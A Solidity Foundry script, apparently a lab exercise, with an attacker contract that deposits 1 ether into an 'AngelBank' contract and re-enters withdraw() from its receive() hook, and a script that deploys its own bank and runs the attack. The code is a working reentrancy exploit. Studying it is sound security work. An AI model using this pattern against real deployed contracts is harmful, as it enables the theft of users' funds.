// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {AngelBank} from "../src/AngelBank.sol";

contract ChainReentrancy {
    AngelBank public angelBank;
    bool public stopAttack;

    constructor(address _angelBankAddress) {
        angelBank = AngelBank(_angelBankAddress);
    }

    receive() external payable {
        if (!stopAttack) {
            stopAttack = true;
            angelBank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        angelBank.deposit{value: 1 ether}();

        console.log("My balance previous: ", address(this).balance);
        angelBank.withdraw();
        console.log("My balance after: ", address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyAttackTest is Script {
    AngelBank public angelBank;
    ChainReentrancy public attacker;

    function run() external {
        vm.startBroadcast();

        angelBank = new AngelBank();

        attacker = new ChainReentrancy(address(angelBank));

        attacker.attack{value: 1 ether}();

        vm.stopBroadcast();
    }
}